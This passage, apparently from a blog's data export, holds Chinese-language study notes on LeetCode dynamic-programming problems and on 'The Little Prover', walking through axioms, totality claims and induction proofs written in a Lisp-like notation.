ispalid(i+1,j-1)\n\n\n這題其實做從中心展開會比較好\n\n都是n^2，還比較簡單\n\n\n\n\nLC516\n\npalindromic\n\n不用在失敗時結束，要把字刪掉\n\nmax(dp(i+1,j),dp(i,j-1))\n\n\n剩下就是原本的dp\n\n\n\n\nLC322\n\ncoin\n\n有兩種\n\n一個是從背包抄來的\n\nf(total, i)\n\n一個是完全不用: f(total, i-1)\n一個是一直try: f(total-arr[i]*n, i)\n\n\n這是n^2\n\n\n另一個是用total做狀態\n\nf(total)\n\n每個都try: min([f(total-n) for n in arr])\n\n\n這個是n\n\n\n\n\n\n\n\n\nLC139\n\nword break\n\n這不是教科書會出現的dp經典\n\n但是處理leetcode的字串列舉常常用到\n\n\nf(s)\n\n對bank的每個字比開頭\n\nf(s[len(w):])\n\n\n題外話\n\nbank的處理還有一個是用bfs配把字碼調\n\n像*bc、a*b、ab*\n處理換字能不能換成另一個字的問題\n\n再題外話\n\n像是倒水問題這種狀態變化固定的都可以用bfs找最短路徑\n\n但要把狀態定義好!!\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nLC152\n\nLIS\n\n這題是LIS的進化版\n\n原本是\n\nlis(i)\n\nmax(arr[i], arr[i]+lis(i))\n\n\n\n\n但負數也有可能會是選項!!\n\n所以要同時計min與max，不能像原版只用max\n\n\n\n\n\n\n\n\nLC354\n\nLIS\n\n這題是二維LIS\n\n但要處理第一維同數字的問題\n\n第一維increasing排序\n第二維decreasing排序\n\n\n\n\n\n\n\n\nLC64\n\n棋盤\n\n就是看能往哪走\n\nf(i,j)\n\ngrid[i][j]+min(f(i-1,j), f(i,j-1))\n\n\n建議都是用終點去推\n\nTODO: 有一題就是一定要用終點推\n\n\n如果用起點走就是dfs\n\n\n\n\n\n\nLC338\n\n奇偶\n\n偶: 2n\n奇: 2n+1\n\n\n可以直接用!!\n\n\nLC96\n\nBST與range\n\nBST就是左邊小、右邊大\n\n所以有range\n\n\nBST是tree\n\n常用的dfs\n\n\n\n\n在range上列舉中點，算組合數\n\n\n\nhard\n\nLC87\n\n這種有明確標示動作與做reduction對象的都很簡單\n但這題要注意swap的string可能還沒被比完!!\n\n要用cache_computing\n\n\n\n\nLC396\n\n把函數列出來\n\n找規律 (所以難，有緣就找的到)\n\nf(n) = f(n-1) - sum + len(arr)*arr[n-1]\n\n\n\n\n\n\nLC312\n\n如果用平常的作法\n\nf(i,j)是i~j的最大分數就會變成兩邊\n\n十分痛苦\n\n\n要看成\n\n這區域的氣球都爆完的分數有多少\n\n列舉要爆的氣球\n\nmax( nums[left] * nums[i] * nums[right] + dp(left, i) + dp(i, right) for i in range(left+1, right) )\n\n\n\n\n\n\n\n\n\n\nLC926\n\n分成ones與zeros就可以看出要用prefix sum\n如果要用dp，就要看怎麼建構合法的答案\n\n最後一位如果是1，可以直接接上去\n如果是0，不是把前面的1換成0，就是把自己這一位換成1\n\n\n\n\nLC600\n\nf(i)i位數的合法組合數 (沒有連續1)\n\n以5為例\n\n10 111 ~ 10 000: f(3)\n0 1111 ~ 0 0000: f(4)\n\n11 111 ~ 11 000非法\n01 111 ~ 01 000會被包含\n\n\nf(i) = f(i-1)+f(i-2)\n\n\n所以剩下就是從最高位往下加f(k)\n同時看有沒有連續1出現!!\n\n\n\n\nLC44\n\n其實就是用string比對處理(edit dist)\n但要注意最後pat只剩下star的狀態!!\n\n\nLC188\n\n能用到mutual recursion!!\n定義buy(i,k)andsell(i,k)\n\n分別定義\n\nbuy(i,k): 在i時還有k次購買機會的購買的最大收益\n\nbuy(i-1,k)\nsell(i-k,k-1)-arr[i]\n\n\nsell(i,k): 在i時還有k次購買機會的賣出的最大收益\n\nsell(i-1,k)\nbuy(i-k,k)+arr[i]\n\n\n\n\n\n\n另外也可以用挑區段，去接來看\n如果當成lis去看，之後跑k次\n\n分成歷史上的最大(global)與當前的最大(local)\n之後就是用lis更新local\n之後更新global\n\nlocal = max(global[i], local + prices[i] - prices[i-1])\nglobal[i] = max(global[i-1], local)\n\n\n\n\n另外。LC122\n\n最高到最低的總和就是各個區段的總和\n所以就是在increasing時把所有差額加起來\n\n\n\n\nLC376\n\n這題對我有因緣\n因為是用自己的dp過的\n\n先過整條array看是increasing還是decreasing\n之後根據方向，跑lis\n\n\n因為有兩個方向，所以可以定義mutual recursion\n\narr[i-1] &gt; arr[i]\n\nup[i] = down[i-1]+1\ndown[i] = down[i-1]\n\n\narr[i-1] &lt; arr[i]\n\nup[i] = up[i-1]\ndown[i] = up[i-1]+1\n\n\narr[i-1] == arr[i]\n\nup[i] = up[i-1]\ndown[i] = down[i-1]\n\n\n\n\n\n\n\nline sweap\n\n把起終點分開，[start, -height], [end, height]\n根據位置與高度排序\n之後一個一個走\n\n把高度塞到heap中 (line sweap)\n\n負的就塞\n正的就去刪\n\n\n之後就是用heap去確認當前高度，去調整答案\n\n\n\nelegant sol\n\n這裡是收集一些原本用dp但是有超級優雅的解\nLC828\n\nfrom lee215\nAXXXAXXA\n\n看中間的A到左右兩邊的A隔3與2個字元(4與3個洞)\n所以只包含中間A的組合是12\n\n\n所以只要針對所有字元中間的洞算組合數就好!!\n\n\nLC1569\n\n這是BST，有左右兩邊\n而我們有第一個點，root\n可以分左右兩邊\n算組合數: comb(len(right)+len(left), len(right))*f(right)*f(left)\n\n\nLC678\n\n把所有星號當成左括號，去計數，如果左括號太少，就直接False\n把所有星號當成右括號，去計數，全部跑完，看有沒有被扣完\n\n\n\n","categories":["Algorithm","Tips"]},{"title":"The little prover 筆記","url":"/2021/07/the-little-prover-note/","content":"動機\n久遠筆記搬到github這裡，不過也是改寫超多東西的\n\nkeyword\npremise，在if的條件有可以用在想改寫的東西\ntheorem，永遠為true的expression (要證過)\naxiom，不用證明的theorem\nclaim，還沒證的theorem\ndefun，函數，但應該當成類似macro的東西\ntotal，不論什麼參數都會有值的函數\naxioms\n(dethm equal-same (x)    (equal (equal x x) &#x27;t))(dethm equal-swap (x y)    (equal (equal x y) (equal y x)))(dethm equal-if (x y)    (if (equal x y) (equal x y) &#x27;t))\n(dethm if-true (x y)    (equal (if &#x27;t x y) x))(dethm if-false (x y)    (equal (if &#x27;nil x y) y))(dethm if-same (x y)    (equal (if x y y) y))(dethm if-nest-A (x y z)    (if x (equal (if x y z) y) &#x27;t))(dethm if-nest-E (x y z)    (if x &#x27;t (equal (if x y z) z)))\n(dethm atom/cons (x y)    (equal (atom (cons x y)) &#x27;nil))(dethm car/cons (x y)    (equal (car (cons x y)) x))(dethm cons/car+cdr (x)    (if (atom x) &#x27;t (equal (cons (car x) (cdr x)) x)))(dethm cdr/cons (x y)    (equal (cdr (cons x y)) y))\n(dethm natp/size (x)    (equal (natp (size x)) &#x27;t))(dethm size/car (x)    (if (atom x) &#x27;t (equal (&lt; (size (car x)) (size x)) &#x27;t)))(dethm size/cdr (x)    (if (atom x) &#x27;t (equal (&lt; (size (cdr x)) (size x)) &#x27;t)))\n(dethm identity-+ (x)     (if (natp x) (equal (+ 0 x) x) ‘t))(dethm commute-+ (x y)     (equal (+ x y) (+ y x)))(dethm associate+ (x y z)     (equal (+ (+ x y) z) (+ x (+ y z))))(dethm positives+ (x y)     (if (&lt; 0 x) (if (&lt; 0 y) (equal (&lt; 0 (+ x y)) ‘t) ‘t) ‘t))(dethm natp+ (x y)     (if (natp x) (if (natp y) (equal (natp (+ x y)) ‘t) ‘t) ‘t))(dethm  common-addends-&lt; (x y z)     (equal (&lt; (+ x z) (+ y z)) (&lt; x y)))\n怎麼用theorem\n要改寫用的equal只能在if-answer或if-else，同時該equal不能出現在if-question或function call的參數中．\n(dethm ?? (x)    (if (A x)         (if (B x)          (equal (F1 x) &#x27;1)          (equal (F2 x) &#x27;2))         (if (C x)          (equal (F3 x) &#x27;3)          (equal (F4 x) &#x27;4)))) (cons &#x27;gyre     (if (C &#x27;(callooh callay))         (cons &#x27;gimble          (if (A &#x27;(callooh callay))               (cons &#x27;1 &#x27;(outgrabe))              (cons &#x27;3 &#x27;(wabe))))        (cons (F4 &#x27;(callooh callay)) &#x27;(vorpal))))\n試著用??來改寫這個式子．\n(F4 '(callooh callay))能被改寫成’4嗎？\n有C的前提，同時該位置也在if-else，但是沒有A的前提，所以不行．\n那1與3可以改寫成(F1 …)與(F2 …)嗎？\n可以！！\nA與C的前提都有，同時都在相對應的位置上，所以可以．\n要total才行，partial function\n(defun partial (x)     (if (partial x)         &#x27;nil         &#x27;t))\n(dethm contradiction () 'nil)\n‘nil\n-&gt; if-same\n(if (partial x) nil nil)\n-&gt; if-nest-A (enlarge\n(if (partial x)    (if (partial x) nil t)    ‘nil)\n-&gt; if-nest-E (enlarge\n(if (partial x)    (if (partial x) nil t)    (if (partial x) t nil))\n-&gt; expand(use) (partial x) (self-reference)\n(if (partial x)    (if (if (partial x) nil t) nil t)    (if (if (partial x) nil t) t nil))\n-&gt; if-nest-A &amp; if-nest-E (shrink\n(if (....)    (if nil nil t)    (if t t nil))\n-&gt; t\nmeasure\nmeasure，追蹤某個參數的長度 (證明遞迴會收斂)\n(defun sub (x y)    (if (atom y)        (if (equal y &#x27;?)        x        y)    (cons (sub x (car y))        (sub x (cdr y)))))measure: (size y)\ntotality claim\n(if (natp (size x))    (if (atom x)        &#x27;t        (&lt; (size (cdr x)) (size x)))    &#x27;nil)\nIf Lifting\n(A (if x y z)) -&gt; (if x (A y) (A z))\n(ctx    (focus      (if Q A E)))\n=&gt; if-same\n(ctx  (if Q    (focus        (if Q A E))    (focus        (if Q A E))))\n=&gt; if-next-A&amp;E\n(ctx  (if Q    (focus         A)    (focus         E)))\n做Totality Claims\n(defun add-atoms (x ys)    (if (atom x)        (if (member? x ys)            ys            (cons x ys))        (add-atoms (car x)            (add-atoms (cdr x) ys))))\n基本上就是把每一次遞迴所apply的參數，apply到measure去，同時寫下這次遞迴比原本的measure小\n\n針對每個case建分支\n\n(if (atom x)        ...        ...)\n\n找自己的遞迴，沒有的直接換成’t\n\n(if (atom x)        &#x27;t        ...)\n\n從第一個遞迴開始轉成measure，measure參數代此遞迴的參數，如果不只一個就用if包起來\n\n(if (atom x)        &#x27;t        (if (&lt; (size (car x)) (size x))            (&lt; (size (cdr x)) (size x))            nil))\n\n最後用natp包起來(證明size是自然數)\n\n(if (natp (size x))    (if (atom x)            &#x27;t            (if (&lt; (size (car x)) (size x))                (&lt; (size (cdr x)) (size x))                &#x27;nil))    &#x27;nil)\n做induction template\n(defun set? (xs)    (if (atom xs)        &#x27;t        (if (member? (car xs) (cdr xs))            &#x27;nil            (set? (cdr xs)))))(defun add-atoms (x ys)    (if (atom x)        (if (member? x ys)            ys            (cons x ys))        (add-atoms (car x)            (add-atoms (cdr x) ys))))\n(dethm set?/add-atoms (a)    (equal (set? (add-atoms a &#x27;())) &#x27;t))\n\n把所有東西參數化\n\n(equal (set? (add-atoms a bs)) &#x27;t)\n\n分析裡面的參數，讓他在所有情況下都會成立\n\n先從bs開始，因為在add-atoms裡面他沒有涉及到遞迴的部分，比較簡單\n要怎麼讓(equal (set? (add-atoms a bs)) 't)成立?\nbs要讓set?為’t\n\n讓主體的前提滿足\n\n(if (set? bs)    (equal (set? (add-atoms a bs)) &#x27;t)    &#x27;t))\n只要有bs都會有這一段，等一下還會看到很多次\n接著是a，他有兩個case\natom，沒有遞迴，直接抄前面的\n(if (atom a)    (if (set? bs)        (equal (set? (add-atoms a bs)) &#x27;t)        &#x27;t))    ...)\nlist，有遞迴裡面有遞迴!!\n(add-atoms (car x) (add-atoms (cdr x) ys))\n先處理最外面的add-atoms，直接把(car x)與(add-atoms (cdr x) ys)當成input，試著讓我們要證的東西成立\n(if (set? (add-atoms (cdr x) ys))    (equal (set? (add-atoms (car x) (add-atoms (cdr x) ys))) &#x27;t)    &#x27;t))\n剛剛是第一個前提，接著是(add-atoms (cdr x) ys)，用同樣的方法\n(if (set? (cdr x))    (equal (set? (add-atoms (cdr x) ys) &#x27;t)    &#x27;t))\n這是第二個前提，我們把所有前依據以順序組合在一起(用if)\n(if (atom a)    (if (set? bs)        (equal (set? (add-atoms a bs)) &#x27;t)        &#x27;t)    (if (if (set? (add-atoms (cdr x) ys))            (equal (set? (add-atoms (car x) (add-atoms (cdr x) ys))) &#x27;t)            &#x27;t)            (if (if (set? (cdr x))                (equal (set? (add-atoms (cdr x) ys) &#x27;t)                &#x27;t))                ...                &#x27;t)))\n最後的…，就是我們在這個case原本想證的東西\n(if (atom a)    (if (set? bs)        (equal (set? (add-atoms a bs)) &#x27;t)        &#x27;t)    (if (if (set? (add-atoms (cdr x) ys))            (equal (set? (add-atoms (car x) (add-atoms (cdr x) ys))) &#x27;t)            &#x27;t)            (if (if (set? (cdr x))                (equal (set? (add-atoms (cdr x) ys) &#x27;t)                &#x27;t))                (if (set? bs)                    (equal (set? (add-atoms a bs)) &#x27;t)                    &#x27;t))                &#x27;t)))\n等等，有些變數對不上啊\n其實變數就依據case的變數去改就好，alpha reduction\n(if (atom x)    (if (set? ys)        (equal (set? (add-atoms a ys)) &#x27;t)        &#x27;t)    (if (if (set? (add-atoms (cdr x) ys))            (equal (set? (add-atoms (car x) (add-atoms (cdr x) ys))) &#x27;t)            &#x27;t)            (if (if (set? (cdr x))                (equal (set? (add-atoms (cdr x) ys) &#x27;t)                &#x27;t))                (if (set? ys)                    (equal (set? (add-atoms x ys)) &#x27;t)                    &#x27;t))                &#x27;t)))\n看到這裡，會發現totality claim與induction template的做法其實很像\n\n分析case\n從被遞迴的input開始，切case\n沒遞迴的case就是滿足其他參數的條件，包好就完成沒遞迴的case\n遞迴的case要從最外層的遞迴一層一層建，建法與沒遞迴的case的結果很像，不過參數要代成遞迴時代入的參數\n把所有前提寫完，就把要證的帶進去，當然要注意其他參數的條件要滿足!!\n\n這邊附上兩個常見template\nProof by List Induction\nmeasure: (size x)\n(if (atom x)    C    (if Ccdr        C        &#x27;t))\nProof by Star Induction\nmeasure: (size x)\n(if (atom x)    C    (if Ccar        (if Ccdr            C             t)    &#x27;t))\nInsights\n選好做的\nBut some approaches will find a proof faster than others.\n(equal (if (equal (first-of (cons a (cons &#x27;? &#x27;())))                   &#x27;?)            &#x27;t            (equal (second-of (cons a (cons &#x27;? &#x27;()))) ?))        ‘t)\n如果從second-of開始改寫，會變成’t，就可以if-same再改成’t\n這樣就不用管first-of如何．\nInsight: Rewrite from the Inside Out\n從if-ans,if-else, arg來改寫，再apply func，如果真的不行了，再改寫外部．\nInsight: Pull Ifs Outward\n當if被func或其他if包起來時，用if lifting把if拉出來．\nInsight: Keep Theorems in Mind\n看到可以用的就用，看到很像的，想辦法改寫到可以用．\nInsight: Don’t Touch Inductive Premises\n歸納前提就是重點，不要動\n如果不能用，也許是\n\n用錯歸納法template了\n需要其他lemma\n\nInsight: Combine Ifs\n用if lifting把if條件中的if拿出來\nInsight: Create Helpers for Induction\nTo rewrite the application of a recursive function, prove a separate theorem about the recursive function using induction. Do this if the current proof either does not use induction, or uses induction for a different kind of recursion from the function, or uses induction on different arguments from the application.\nInsight: Create Helpers for Repetition\nIf a proof performs similar sequences of steps over and over, state a theorem that can perform the same rewrite as those steps via the Law of Dethm. Use that theorem in place of the sequence of steps to shorten the proof.\nproof for memb?/remb\n(defun remb (xs)    (if (atom xs)        &#x27;()        (if (equal (car xs) &#x27;?)            (remb (cdr xs))            (cons (car xs)                (remb (cdr xs))))))(defun memb? (xs)    (if (atom xs)        &#x27;nil        (if (equal (car xs) &#x27;?)            &#x27;t            (memb? (cdr xs)))))(dethm memb?/remb (xs)    (equal (memb? (remb xs)) &#x27;nil))\nthe inductive claim\n(if (atom xs)    (equal (memb? (remb xs)) &#x27;nil)    (if (equal (memb? (remb (cdr xs))) &#x27;nil)        (equal (memb? (remb xs)) &#x27;nil)        &#x27;t))\n先從(atom xs)的if-ans開始\n(if (atom xs)    (equal (memb?              (if (atom xs)                  ‘()                  (if (equal (car xs) ‘?)                      (remb (cdr xs))                      (cons (car xs) (remb (cdr xs))))))            nil)    ...)\n-&gt; if-nest-A\n(if (atom xs)    (equal (memb? ‘()) nil)    ...)\n-&gt; expand memb? &amp; atom &amp; if-true\n(if (atom xs)    &#x27;t    ...)\n接著是not (atom xs)與(equal (memb? (remb (cdr xs))) nil)\n(equal (memb? (remb xs)) nil)\n-&gt; remb\n(equal (memb?        (if (atom xs) ‘()        (if (equal (car xs) ‘?)            (remb (cdr xs)            (cons (car xs) (remb (cdr xs)))))      nil)\n-&gt; if-nest-E &amp; if lifting for memb?\n(equal (if (equal (car xs) ‘?)            (memb? (remb (cdr xs))            (memb? (cons (car xs) (remb (cdr xs)))))      nil)\n-&gt; inductive premise\n(equal (if (equal (car xs) ‘?)            nil            (memb? (cons (car xs) (remb (cdr xs)))))      nil)\n-&gt; memb?\n(equal (if (equal (car xs) ‘?)            nil            (if (atom (cons (car xs) (remb (cdr xs))))                ‘nil                (if (equal (car (cons (car xs) (remb (cdr xs)))) ‘?)                    ‘t                    (memb? (cdr (cons (car xs) (remb (cdr xs)))))))      nil)\n-&gt; atom/cons &amp; if-false\n(equal (if (equal (car xs) ‘?)            nil            (if (equal (car (cons (car xs) (remb (cdr xs)))) ‘?)                ‘t                (memb? (cdr (cons (car xs) (remb (cdr xs))))))\t    nil)\n-&gt; car/cons &amp; if-false &amp; cdr/cons &amp; inductive premise\n(equal (if (...) nil nil) nil)\n-&gt; if-same &amp; equal-same\nt\nproof for ctx?/sub\n(defun ctx? (x)  (if (atom x)    (equal x &#x27;?)    (if (ctx? (car x))      &#x27;t      (ctx? (cdr x)))))(defun sub (x y)  (if (atom y)    (if (equal y &#x27;?)      x      y)    (cons (sub x (car y))          (sub x (cdr y)))))\n證\n(dethm ctx?/sub (x y)  (if (ctx? x)      (if (ctx? y)          (equal (ctx? (sub x y)) &#x27;t)          &#x27;t)  &#x27;t))\n把body填入templete(有夠噁心的\n(if (atom y)\t(if (ctx? x)    (if (ctx? y)      (equal (ctx? (sub x y)) &#x27;t)      &#x27;t)  &#x27;t)  (if (if (ctx? x)        (if (ctx? (car y))          (equal (ctx? (sub x (car y))) &#x27;t)          &#x27;t)      &#x27;t)      (if (if (ctx? x)            (if (ctx? (cdr y))              (equal (ctx? (sub x (cdr y))) &#x27;t)              &#x27;t)            ‘t)\t\t\t    (if (ctx? x)            (if (ctx? y)              (equal (ctx? (sub x y)) &#x27;t)              &#x27;t)            &#x27;t)          &#x27;t)        ‘t))\n先看到有一堆(if (ctx? x)，用if lifting抽出來(這裡就不好用(A (if …)) -&gt; (if (A ….))來理解，要用if-same來做就很直覺)\n同時把if-else的部分用if-same去掉\n(if (ctx? x)  (if (atom y)      (if (ctx? y)        (equal (ctx? (sub x y)) &#x27;t)        &#x27;t)      (if (if (ctx? (car y))          (equal (ctx? (sub x (car y))) &#x27;t)          &#x27;t)        (if (if (ctx? (cdr y))              (equal (ctx? (sub x (cdr y))) &#x27;t)              &#x27;t)              (if (ctx? y)                (equal (ctx? (sub x y)) &#x27;t)              &#x27;t)            &#x27;t)          ‘t))  &#x27;t)\n對sub用if-nest-A\n(if (ctx? x)  (if (atom y)      (if (ctx? y)          (equal (ctx? (if (equal y &#x27;?) x y)) &#x27;t)          &#x27;t)      (if (if (ctx? (car y))          (equal (ctx? (sub x (car y))) &#x27;t)          &#x27;t)        (if (if (ctx? (cdr y))              (equal (ctx? (sub x (cdr y))) &#x27;t)              &#x27;t)              (if (ctx? y)                (equal (ctx? (sub x y)) &#x27;t)              &#x27;t)            &#x27;t)          ‘t))  &#x27;t)\nif lifting\n(if (ctx? x) ;; 可以用這個改寫成’t嗎  (if (atom y)      (if (ctx? y)        (if (equal y &#x27;?)      \t    (equal (ctx? x) &#x27;t) ;; 不行，(ctx? x)可以是’t以外的東西(total)，也沒定理            (equal (ctx? y) &#x27;t))        &#x27;t)      (if (if (ctx? (car y))          (equal (ctx? (sub x (car y))) &#x27;t)          &#x27;t)        (if (if (ctx? (cdr y))              (equal (ctx? (sub x (cdr y))) &#x27;t)              &#x27;t)              (if (ctx? y)                (equal (ctx? (sub x y)) &#x27;t)              &#x27;t)            &#x27;t)          ‘t))  &#x27;t)\n但ctx?只會回傳’t或’nil而且如果我們有這種定理的話？\n(dethm ctx?/t (x)    (if (ctx? x)        (equal (ctx? x) ‘t)        ‘t))\n那就可以改寫了\n(if (ctx? x)  (if (atom y)      (if (ctx? y)        (if (equal y &#x27;?)      \t    ‘t            ‘t))         &#x27;t)      (if (if (ctx? (car y))          (equal (ctx? (sub x (car y))) &#x27;t)          &#x27;t)        (if (if (ctx? (cdr y))              (equal (ctx? (sub x (cdr y))) &#x27;t)              &#x27;t)              (if (ctx? y)                (equal (ctx? (sub x y)) &#x27;t)              &#x27;t)            &#x27;t)          ‘t))  &#x27;t)\nif-same*2\n(if (ctx? x)  (if (atom y)      ‘t      (if (if (ctx? (car y))          (equal (ctx? (sub x (car y))) &#x27;t)          &#x27;t)        (if (if (ctx? (cdr y))              (equal (ctx? (sub x (cdr y))) &#x27;t)              &#x27;t)              (if (ctx? y)                (equal (ctx? (sub x y) &#x27;t)                &#x27;t)            &#x27;t)          ‘t))  &#x27;t)\natom與if-nest-E\n(if (ctx? x)  (if (atom y)      ‘t      (if (if (ctx? (car y))          (equal (ctx? (sub x (car y))) &#x27;t)          &#x27;t)        (if (if (ctx? (cdr y))              (equal (ctx? (sub x (cdr y))) &#x27;t)              &#x27;t)              (if (ctx? y)                (equal (ctx? (cons (sub x (car y)) (sub (cdr y)))) &#x27;t)              &#x27;t)            &#x27;t)          ‘t))  &#x27;t)\nctx?\n(if (ctx? x)  (if (atom y)      ‘t      (if (if (ctx? (car y))          (equal (ctx? (sub x (car y))) &#x27;t)          &#x27;t)          (if (if (ctx? (cdr y))                  (equal (ctx? (sub x (cdr y))) &#x27;t)                  &#x27;t)              (if (ctx? y)                  (equal (if (ctx? (sub x (car y)))                              ‘t                              (ctx? (sub x (cdr y))))                        &#x27;t)                  &#x27;t)              &#x27;t)          ‘t))  &#x27;t)\nctx?\n(if (ctx? x)  (if (atom y)      ‘t      (if (if (ctx? (car y)) ;; here              (equal (ctx? (sub x (car y))) &#x27;t)              &#x27;t)          (if (if (ctx? (cdr y))                (equal (ctx? (sub x (cdr y))) &#x27;t)                &#x27;t)              (if (if (ctx? (car y)) ;; here                      ‘t                      (ctx? (cdr y)))                  (equal (if (ctx? (sub x (car y)))                            ‘t                            (ctx? (sub x (cdr y))))                        &#x27;t)                  &#x27;t)              &#x27;t)          ‘t))  &#x27;t)\nif lifting\n(if (ctx? x)  (if (atom y)      ‘t      (if (ctx? (car y))          (if (equal (ctx? (sub x (car y))) &#x27;t);; inductive promsing!!                (if (if (ctx? (cdr y))                        (equal (ctx? (sub x (cdr y))) &#x27;t)                        &#x27;t)                    (equal (if (ctx? (sub x (car y)))                                ‘t                                (ctx? (sub x (cdr y))))                            &#x27;t)                    &#x27;t)                (if (if (ctx? (cdr y))                        (equal (ctx? (sub x (cdr y))) &#x27;t)                        &#x27;t)                    (if (ctx? (cdr y))                        (equal (if (ctx? (sub x (car y)))                                    ‘t                                    (ctx? (sub x (cdr y))))                                &#x27;t)                        &#x27;t)                    ‘t))))  &#x27;t)\ninductive promsing\n(if (ctx? x)  (if (atom y)      ‘t      (if (ctx? (car y))                t                (if (if (ctx? (cdr y))                        (equal (ctx? (sub x (cdr y))) &#x27;t)                        &#x27;t)                    (if (ctx? (cdr y))                        (equal (if (ctx? (sub x (car y)))                                    ‘t                                    (ctx? (sub x (cdr y))))                                &#x27;t)                        &#x27;t)                    ‘t)))&#x27;t)\nif lifting\n(if (ctx? x)  (if (atom y)      ‘t      (if (ctx? (car y))          t          (if (ctx? (cdr y))              (if (equal (ctx? (sub x (cdr y))) &#x27;t) ;; inductive promsing!!                  (equal (if (ctx? (sub x (car y)))                                ‘t                                (ctx? (sub x (cdr y))))                          ‘t)                  &#x27;t)              ‘t)))  &#x27;t)\ninductive promsing &amp; if-same &amp; if-true\nt\n(剩下的那一個，就pass，打這個好累)\n發現有許多差不多的前提，用if-nest-A/E或if lifting把他們化簡\n把inductive promise湊出來\n一次化簡或處理一個case\nproof for set?/add-atoms\nif lifting is our friend.\n(atom case) add-atoms, if-nest-A, (atom a)\n(if (atom a)    (if (set? bs)      \t(equal (set? (if (member? a bs)                          bs                          (cons a bs))) ‘t)\t      ‘t)    (if (if (set? (add-atoms (cdr x) bs))\t          (equal (set? (add-atoms (car x) (add-atoms (cdr x) bs))) ‘t)\t          ‘t)        (if (if (set? bs)\t              (equal (set? (add-atoms (cdr x) bs)) ‘t)\t              ‘t)            (if (set? bs)                (equal (set? (add-atoms a bs)) ‘t)                ‘t)            ‘t)        ‘t))\nif lifting, promise (another claim)\n(if (atom a)    (if (set? bs)      \t(equal (if (member? a bs)                    (set? bs)                    (set? (cons a bs))) ‘t)\t      ‘t)    (if (if (set? (add-atoms (cdr x) bs))\t          (equal (set? (add-atoms (car x) (add-atoms (cdr x) bs))) ‘t)\t          ‘t)        (if (if (set? bs)\t              (equal (set? (add-atoms (cdr x) bs)) ‘t)\t              ‘t)            (if (set? bs)                (equal (set? (add-atoms a bs)) ‘t)                ‘t)            ‘t)          ‘t))\nset?, member?, if-nest-E, if-same, equal, if-same\n(if (atom a)    &#x27;t    (if (if (set? (add-atoms (cdr x) bs))\t          (equal (set? (add-atoms (car x) (add-atoms (cdr x) bs))) ‘t)\t          ‘t)        (if (if (set? bs)\t              (equal (set? (add-atoms (cdr x) bs)) ‘t)\t              ‘t)            (if (set? bs)                (equal (set? (add-atoms a bs)) ‘t)                ‘t)            ‘t)          ‘t))\nif lifting\n(if (atom a)    &#x27;t    (if (if (set? (add-atoms (cdr x) bs))\t          (equal (set? (add-atoms (car x) (add-atoms (cdr x) bs))) ‘t)\t          ‘t)        (if (set? bs)            (if (equal (set? (add-atoms (cdr x) bs)) ‘t)                (equal (set? (add-atoms a bs)) ‘t)                ‘t)            &#x27;t)        ‘t))\nif lifting again!!\n(if (atom a)    &#x27;t    (if (set? bs)        (if (if (set? (add-atoms (cdr x) bs))                (equal (set? (add-atoms (car x) (add-atoms (cdr x) bs))) ‘t)                ‘t)            (if (equal (set? (add-atoms (cdr x) bs)) ‘t)                (equal (set? (add-atoms a bs)) ‘t)                ‘t)            ‘t)        &#x27;t))\nif lifting\n(if (atom a)    &#x27;t    (if (set? bs)        (if (set? (add-atoms (cdr x) bs)) ;;可以用嗎？          (if (equal (set? (add-atoms (car x) (add-atoms (cdr x) bs))) ‘t)              (if (equal (set? (add-atoms (cdr x) bs)) ‘t)                  (equal (set? (add-atoms a bs)) ‘t)                  ‘t)              ‘t)          (if (equal (set? (add-atoms (cdr x) bs)) ‘t) ;; need a new claim              (equal (set? (add-atoms a bs)) ‘t)              ‘t))        &#x27;t))\n(dethm set?/nil (xs)    (if (set? xs)        ‘t        (equal (set? xs) ‘nil)))\nset?/nil &amp; set?/t\n(if (atom a)    &#x27;t    (if (set? bs)        (if (set? (add-atoms (cdr x) bs)) ;;用!!          (if (equal (set? (add-atoms (car x) (add-atoms (cdr x) bs))) ‘t)              (if (equal ‘t ‘t)                  (equal (set? (add-atoms a bs)) ‘t)                  ‘t)              ‘t)          (if (equal ‘nil ‘t)              (equal (set? (add-atoms a bs)) ‘t)              ‘t))        &#x27;t))\nequal\n(if (atom a)    &#x27;t    (if (set? bs)        (if (set? (add-atoms (cdr x) bs))          (if (equal (set? (add-atoms (car x) (add-atoms (cdr x) bs))) ‘t)              (equal (set? (add-atoms a bs)) ‘t)              ‘t)           t)        &#x27;t))\nadd-atoms &amp; if-nest-E\n(if (atom a)    &#x27;t    (if (set? bs)        (if (set? (add-atoms (cdr x) bs)) ;;用!!          (if (equal (set? (add-atoms (car x) (add-atoms (cdr x) bs))) ‘t)               (equal (set? (add-atoms (car x) (add-atoms (cdr x) bs))) ‘t)              ‘t)           t)        &#x27;t))\npromise\nt\n證原本要證的\n(dethm set?/atoms (a)      (equal (set? (atoms a)) &#x27;t))\n先把(atoms a)換成(add-atoms a ‘())\n(equal (set? (dad-atoms a ‘())) 't)\n要有(set? xs)，才能用set?/add-atoms\nif-true\n(if t    (equal (set? (add-atoms a ‘())) &#x27;t)    t)\nif-true\n(if (if t        t        (if (member? (car ‘()) (cdr ‘()))            nil\t          (set? (cdr ‘()))))    (equal (set? (add-atoms a ‘())) &#x27;t)    t)\n(equal t (atom ())\n(if (if (atom ())        t        (if (member? (car ‘()) (cdr ‘()))            nil\t          (set? (cdr ‘()))))    (equal (set? (add-atoms a ‘())) &#x27;t)    t)\nset?\n(if (set? ())    (equal (set? (add-atoms a ‘())) &#x27;t)    t)\nset?/add-atoms\nt\nCh10 different measure &amp; change the promise\n(defun rotate (x)    (cons (car (car x))        (cons (cdr (car x)) (cdr x))))(defun align (x)  (if (atom x)      x      (if (atom (car x))          (cons (car x) (align (cdr x)))          (align (rotate x)))))(size x) ??\nalign的長度都一樣，需要別的measure\n(defun wt (x)  (if (atom x)      &#x27;1      (+ (+ (wt (car x)) (wt (car x)))          (wt (cdr x)))))measure: (size x)\ntotality claim是\n(if (natp (wt x))    (if (atom x)        &#x27;t        (if (atom (car x))            (&lt; (wt (cdr x)) (wt x))            (&lt; (wt (rotate x)) (wt x))))    &#x27;nil)(dethm natp/wt (x)     (equal (natp (wt x)) &#x27;t))\n(if (natp (size x))    (if (atom x)        &#x27;t        (if (atom (car x))            (&lt; (wt (cdr x)) (wt x))            (&lt; (wt (rotate x)) (wt x))))    &#x27;nil)\n=&gt; natp/wt\n(if (atom x)    &#x27;t    (if (atom (car x))        (&lt; (wt (cdr x)) (wt x))        (&lt; (wt (rotate x)) (wt x))))\n=&gt; wt\n(if (atom x)    &#x27;t    (if (atom (car x))        (&lt; (wt (cdr x)) (+ (+ (wt (car x)) 